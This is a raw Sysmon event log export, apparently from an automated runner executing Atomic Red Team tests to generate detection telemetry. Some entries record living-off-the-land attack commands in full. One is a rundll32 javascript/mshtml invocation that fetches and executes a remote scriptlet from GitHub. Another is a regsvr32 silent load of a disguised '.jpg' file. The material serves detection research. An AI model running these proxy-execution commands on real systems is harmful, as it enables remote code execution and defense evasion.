FileVersion: 4.18.25110.5 (4a6978a838df7287d907bb2ee8a2eeb2373b186e)
Description: Client Interface
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: mpclient.dll
Hashes: SHA256=F1CA293E6D05A500EB026529A27948B01B6467D0E9C20C6049101C2B2829B96A
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:07:32 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:07:32.218
ProcessGuid: {f995aebf-64c4-6942-8206-000000000e00}
ProcessId: 1228
Image: C:\Windows\system32\rundll32.exe
TargetObject: HKLM\System\CurrentControlSet\Control\SecurityProviders\SCHANNEL
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:07:32 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:07:32.147
ProcessGuid: {f995aebf-64c4-6942-8206-000000000e00}
ProcessId: 1228
Image: C:\Windows\System32\rundll32.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25110.5-0\MpOAV.dll
FileVersion: 4.18.25110.5 (4a6978a838df7287d907bb2ee8a2eeb2373b186e)
Description: IOfficeAntiVirus Module
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: MpOAV.dll
Hashes: SHA256=0EF8AE9CC8E3722C0AE09B55531BBA2F2A3422CCF4A1BB9B37ABDB4808AAC232
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:07:32 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:07:32.066
ProcessGuid: {f995aebf-64c4-6942-8206-000000000e00}
ProcessId: 1228
Image: C:\Windows\System32\rundll32.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows host process (Rundll32)
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: RUNDLL32.EXE
CommandLine: rundll32.exe  javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct"").Exec();window.close();
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=2F2321D2A3EEEC2CDD7D921645C121BED75872435926EE97F3D53E7EE7662BF0
ParentProcessGuid: {f995aebf-64c4-6942-8006-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct"").Exec();window.close();
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:07:32 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:07:32.037
SourceProcessGUID: {f995aebf-60f0-6942-4d02-000000000e00}
SourceProcessId: 7600
SourceThreadId: 6580
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE
TargetProcessGUID: {f995aebf-64c4-6942-8006-000000000e00}
TargetProcessId: 3536
TargetImage: C:\Windows\SYSTEM32\cmd.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+1636d4|C:\Windows\System32\KERNELBASE.dll+96a8a|C:\Windows\System32\KERNELBASE.dll+940e6|C:\Windows\System32\KERNEL32.DLL+3c6d4|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+351876|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b3c89|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b35f9|UNKNOWN(00007FF991FCB485)
SourceUser: runnervm8j6r3\runneradmin
TargetUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:07:32 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:07:32.038
ProcessGuid: {f995aebf-64c4-6942-8006-000000000e00}
ProcessId: 3536
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct"").Exec();window.close();
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f0-6942-4d02-000000000e00}
ParentProcessId: 7600
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\b5779890-c6d1-4d54-8cf1-6a4ae2edeb5c.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:07:31 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:07:31.744
SourceProcessGUID: {f995aebf-60f0-6942-4d02-000000000e00}
SourceProcessId: 7600
SourceThreadId: 6580
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE
TargetProcessGUID: {f995aebf-64c3-6942-7f06-000000000e00}
TargetProcessId: 8816
TargetImage: C:\Windows\system32\whoami.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+1636d4|C:\Windows\System32\KERNELBASE.dll+96a8a|C:\Windows\System32\KERNELBASE.dll+940e6|C:\Windows\System32\KERNEL32.DLL+3c6d4|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+351876|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b3c89|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b35f9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\4a7766a1c9970ca229a03b7aa442caed\System.Management.Automation.ni.dll+11c64f9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\4a7766a1c9970ca229a03b7aa442caed\System.Management.Automation.ni.dll+10dabba|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\4a7766a1c9970ca229a03b7aa442caed\System.Management.Automation.ni.dll+1187f2d|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\4a7766a1c9970ca229a03b7aa442caed\System.Management.Automation.ni.dll+1187beb|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\4a7766a1c9970ca229a03b7aa442caed\System.Management.Automation.ni.dll+125f1ff|UNKNOWN(00007FF991BD3401)
SourceUser: runnervm8j6r3\runneradmin
TargetUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:07:31 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:07:31.743
ProcessGuid: {f995aebf-64c3-6942-7f06-000000000e00}
ProcessId: 8816
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60f0-6942-4d02-000000000e00}
ParentProcessId: 7600
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\b5779890-c6d1-4d54-8cf1-6a4ae2edeb5c.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:07:31 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:07:31.724
SourceProcessGUID: {f995aebf-60f0-6942-4d02-000000000e00}
SourceProcessId: 7600
SourceThreadId: 6580
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE
TargetProcessGUID: {f995aebf-64c3-6942-7e06-000000000e00}
TargetProcessId: 2540
TargetImage: C:\Windows\system32\HOSTNAME.EXE
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+1636d4|C:\Windows\System32\KERNELBASE.dll+96a8a|C:\Windows\System32\KERNELBASE.dll+940e6|C:\Windows\System32\KERNEL32.DLL+3c6d4|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+351876|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b3c89|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b35f9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\4a7766a1c9970ca229a03b7aa442caed\System.Management.Automation.ni.dll+11c64f9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\4a7766a1c9970ca229a03b7aa442caed\System.Management.Automation.ni.dll+10dabba|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\4a7766a1c9970ca229a03b7aa442caed\System.Management.Automation.ni.dll+1187f2d|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\4a7766a1c9970ca229a03b7aa442caed\System.Management.Automation.ni.dll+1187beb|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\4a7766a1c9970ca229a03b7aa442caed\System.Management.Automation.ni.dll+125f1ff|UNKNOWN(00007FF991BD3401)
SourceUser: runnervm8j6r3\runneradmin
TargetUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:07:31 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:07:31.724
ProcessGuid: {f995aebf-64c3-6942-7e06-000000000e00}
ProcessId: 2540
Image: C:\Windows\System32\HOSTNAME.EXE
FileVersion: 10.0.26100.2161 (WinBuild.160101.0800)
Description: Hostname APP
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: hostname.exe
CommandLine: ""C:\Windows\system32\HOSTNAME.EXE""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9
ParentProcessGuid: {f995aebf-60f0-6942-4d02-000000000e00}
ParentProcessId: 7600
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\b5779890-c6d1-4d54-8cf1-6a4ae2edeb5c.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:07:28 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:07:28.233
SourceProcessGUID: {f995aebf-60f0-6942-4d02-000000000e00}
SourceProcessId: 7600
SourceThreadId: 6580
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE
TargetProcessGUID: {f995aebf-64c0-6942-7c06-000000000e00}
TargetProcessId: 6400
TargetImage: C:\Windows\SYSTEM32\cmd.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+1636d4|C:\Windows\System32\KERNELBASE.dll+96a8a|C:\Windows\System32\KERNELBASE.dll+940e6|C:\Windows\System32\KERNEL32.DLL+3c6d4|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+351876|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b3c89|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b35f9|UNKNOWN(00007FF991FCB485)
SourceUser: runnervm8j6r3\runneradmin
TargetUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:07:28 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:07:28.233
ProcessGuid: {f995aebf-64c0-6942-7c06-000000000e00}
ProcessId: 6400
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f0-6942-4d02-000000000e00}
ParentProcessId: 7600
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\b5779890-c6d1-4d54-8cf1-6a4ae2edeb5c.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:07:27 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:07:27.991
ProcessGuid: {f995aebf-64bf-6942-7b06-000000000e00}
ProcessId: 8060
Image: C:\Windows\System32\regsvr32.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Microsoft(C) Register Server
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: REGSVR32.EXE
CommandLine: C:\Windows\system32\regsvr32.exe  /U /s C:\Users\RUNNER~1\AppData\Local\Temp\shell32.jpg
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8D1F34DB7D8297E71184CA0EEDD1A291C3930BD3214BC1CCCFA102891AD9DA52
ParentProcessGuid: {f995aebf-64bf-6942-7906-000000000e00}
ParentProcessId: 10036
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c C:\Windows\system32\regsvr32.exe /U /s %temp%\shell32.jpg
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:07:27 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:07:27.966
SourceProcessGUID: {f995aebf-60f0-6942-4d02-000000000e00}
SourceProcessId: 7600
SourceThreadId: 6580
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE
TargetProcessGUID: {f995aebf-64bf-6942-7906-000000000e00}
TargetProcessId: 10036
TargetImage: C:\Windows\SYSTEM32\cmd.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+1636d4|C:\Windows\System32\KERNELBASE.dll+96a8a|C:\Windows\System32\KERNELBASE.dll+940e6|C:\Windows\System32\KERNEL32.DLL+3c6d4|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+351876|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b3c89|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b35f9|UNKNOWN(00007FF991FCB485)
SourceUser: runnervm8j6r3\runneradmin
TargetUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:07:27 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:07:27.967
ProcessGuid: {f995aebf-64bf-6942-7906-000000000e00}
ProcessId: 10036
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c C:\Windows\system32\regsvr32.exe /U /s %%temp%%\shell32.jpg
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f0-6942-4d02-000000000e00}
ParentProcessId: 7600
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\b5779890-c6d1-4d54-8cf1-6a4ae2edeb5c.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:07:27 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:07:27.723
SourceProcessGUID: {f995aebf-60f0-6942-4d02-000000000e00}
SourceProcessId: 7600
SourceThreadId: 6580
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE
TargetProcessGUID: {f995aebf-64bf-6942-7706-000000000e00}
TargetProcessId: 912
TargetImage: C:\Windows\SYSTEM32\cmd.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+1636d4|C:\Windows\System32\KERNELBASE.dll+96a8a|C:\Windows\System32\KERNELBASE.dll+940e6|C:\Windows\System32\KERNEL32.DLL+3c6d4|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+351876|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b3c89|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b35f9|UNKNOWN(00007FF991FCB485)
SourceUser: runnervm8j6r3\runneradmin
TargetUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:07:27 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:07:27.723
ProcessGuid: {f995aebf-64bf-6942-7706-000000000e00}
ProcessId: 912
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f0-6942-4d02-000000000e00}
ParentProcessId: 7600
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\b5779890-c6d1-4d54-8cf1-6a4ae2edeb5c.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:07:27 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:07:27.488
SourceProcessGUID: {f995aebf-60f0-6942-4d02-000000000e00}
SourceProcessId: 7600
SourceThreadId: 6580
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE
TargetProcessGUID: {f995aebf-64bf-6942-7506-000000000e00}
TargetProcessId: 10188
TargetImage: C:\Windows\SYSTEM32\cmd.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+1636d4|C:\Windows\System32\KERNELBASE.dll+96a8a|C:\Windows\System32\KERNELBASE.dll+940e6|C:\Windows\System32\KERNEL32.DLL+3c6d4|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+351876|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b3c89|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b35f9|UNKNOWN(00007FF991FCB485)
SourceUser: runnervm8j6r3\runneradmin
TargetUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:07:27 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:07:27.488
ProcessGuid: {f995aebf-64bf-6942-7506-000000000e00}
ProcessId: 10188
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f0-6942-4d02-000000000e00}
ParentProcessId: 7600
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\b5779890-c6d1-4d54-8cf1-6a4ae2edeb5c.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:07:27 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:07:27.241
SourceProcessGUID: {f995aebf-60f0-6942-4d02-000000000e00}
SourceProcessId: 7600
SourceThreadId: 6580
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE
TargetProcessGUID: {f995aebf-64bf-6942-7306-000000000e00}
TargetProcessId: 5528
TargetImage: C:\Windows\SYSTEM32\cmd.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+1636d4|C:\Windows\System32\KERNELBASE.dll+96a8a|C:\Windows\System32\KERNELBASE.dll+940e6|C:\Windows\System32\KERNEL32.DLL+3c6d4|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+351876|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b3c89|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b35f9|UNKNOWN(00007FF991FCB485)
SourceUser: runnervm8j6r3\runneradmin
TargetUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:07:27 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:07:27.242
ProcessGuid: {f995aebf-64bf-6942-7306-000000000e00}
ProcessId: 5528
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f0-6942-4d02-000000000e00}
ParentProcessId: 7600
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\b5779890-c6d1-4d54-8cf1-6a4ae2edeb5c.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
